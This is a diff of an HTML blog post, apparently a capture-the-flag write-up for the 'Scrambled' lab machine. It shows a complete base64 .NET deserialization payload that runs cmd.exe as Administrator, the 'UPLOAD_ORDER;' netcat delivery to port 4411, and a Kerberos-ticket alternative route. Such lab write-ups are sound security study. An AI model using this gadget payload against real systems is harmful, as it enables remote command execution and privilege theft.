 </span></span><span style="display:flex;"><span>UPLOAD_ORDER;AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAACEAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLlNvcnRlZFNldGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAFQ291bnQIQ29tcGFyZXIHVmVyc2lvbgVJdGVtcwADAAYIjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0IAgAAAAIAAAAJAwAAAAIAAAAJBAAAAAQDAAAAjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0BAAAAC19jb21wYXJpc29uAyJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyCQUAAAARBAAAAAIAAAAGBgAAAFcvYyBjbWQuZXhlIC9DIHR5cGUgQzpcVXNlcnNcQWRtaW5pc3RyYXRvclxEZXNrdG9wXHJvb3QudHh0ID4gQzpcVXNlcnNcTWlzY3N2Y1xQV05FRC50eHQGBwAAAANjbWQEBQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQdtZXRob2QwB21ldGhvZDEDAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5L1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyCQgAAAAJCQAAAAkKAAAABAgAAAAwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5BwAAAAR0eXBlCGFzc2VtYmx5BnRhcmdldBJ0YXJnZXRUeXBlQXNzZW1ibHkOdGFyZ2V0VHlwZU5hbWUKbWV0aG9kTmFtZQ1kZWxlZ2F0ZUVudHJ5AQECAQEBAzBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkGCwAAALACU3lzdGVtLkZ1bmNgM1tbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MsIFN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQYMAAAAS21zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OQoGDQAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5Bg4AAAAaU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MGDwAAAAVTdGFydAkQAAAABAkAAAAvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIHAAAABE5hbWUMQXNzZW1ibHlOYW1lCUNsYXNzTmFtZQlTaWduYXR1cmUKU2lnbmF0dXJlMgpNZW1iZXJUeXBlEEdlbmVyaWNBcmd1bWVudHMBAQEBAQADCA1TeXN0ZW0uVHlwZVtdCQ8AAAAJDQAAAAkOAAAABhQAAAA+U3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MgU3RhcnQoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykGFQAAAD5TeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcyBTdGFydChTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQgAAAAKAQoAAAAJAAAABhYAAAAHQ29tcGFyZQkMAAAABhgAAAANU3lzdGVtLlN0cmluZwYZAAAAK0ludDMyIENvbXBhcmUoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykGGgAAADJTeXN0ZW0uSW50MzIgQ29tcGFyZShTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQgAAAAKARAAAAAIAAAABhsAAABxU3lzdGVtLkNvbXBhcmlzb25gMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0JDAAAAAoJDAAAAAkYAAAACRYAAAAKCw<span style="color:#f92672">==</span></span></span></code></pre></div></p>
 <p>Now let&rsquo;s try to send this encoded payload to see if we get anything back.</p>
+<h3 id="understanding-how-to-send-data">Understanding How to send Data</h3>
 <p>I&rsquo;ll use <em>netcat</em> to connect to the server, however I need to know how to send data for the server to accept it.</p>
 <p>Again using <a href="https://github.com/dnSpy/dnSpy"><em>dnspy</em></a></p>
 <p><img src="finding-request-function.png" alt="Finding Request Method"></p>
@@ -827,6 +881,7 @@ Digging deeper</p>
 <p><img src="finding-value-of-parameters.png" alt="Finding Value of Parameters"></p>
 <p><img src="understanding-the-request-method.png" alt="Understanding the request method"></p>
 <p>I can see that the request is done under this form: <em>UPLOAD_ORDER;[Base64 Encoded Data]</em></p>
+<h3 id="getting-command-execution-as-administrator">Getting Command Execution As Administrator</h3>
 <p>Now I can connect using netcat and test if the payload will work
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nc scrm.local <span style="color:#ae81ff">4411</span>
 </span></span><span style="display:flex;"><span>SCRAMBLECORP_ORDERS_V1.0.3;
@@ -835,7 +890,7 @@ From my previous shell:
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\u</span>sers<span style="color:#ae81ff">\m</span>iscsvc&gt; cat PWNED.txt
 </span></span><span style="display:flex;"><span>296**************************30a</span></span></code></pre></div></p>
 <p>We can now execute commands as <em>Administrator</em></p>
-<p>If you&rsquo;re following along, you might have noticed that the other way to get Administrator directly, and avoid the use of <em>xp_cmdshell</em>, is by simply requesting a <em>TGT</em> for user <em>Miscsvc</em> after getting his credentials and then use the ticket with <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbclient.py"><em>impacket-smbclient.py</em></a> (-k option like before) to read the shares and get <em>ScrambledClient.exe</em> then exploit the server.</p>
+<p>If you&rsquo;re following along, you might have noticed that we can get Administrator directly, and avoid the use of <em>xp_cmdshell</em>, by simply requesting a <em>TGT</em> for user <em>Miscsvc</em> after getting his credentials, and then use the ticket with <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbclient.py"><em>impacket-smbclient.py</em></a> (-k option like before) to read the shares and get <em>ScrambledClient.exe</em> then exploit the server.</p>
 
       </div>
     </article>
@@ -879,7 +934,7 @@ From my previous shell:
           <line x1="16" y1="17" x2="8" y2="17"></line>
           <polyline points="10 9 9 9 8 9"></polyline>
         </svg>
-        3739 Words
+        3726 Words
       </p>
 
       <p>
@@ -1003,9 +1058,10 @@ From my previous shell:
             </div>
 
             
-                <footer class="footer">
+                <footer id="socials" class="footer">
     <main aria-role="main">
         <div class="footer_author">
+            
             
     
             <h2><a href="https://mostxeon.github.io/">Most Xeon</a></h2>
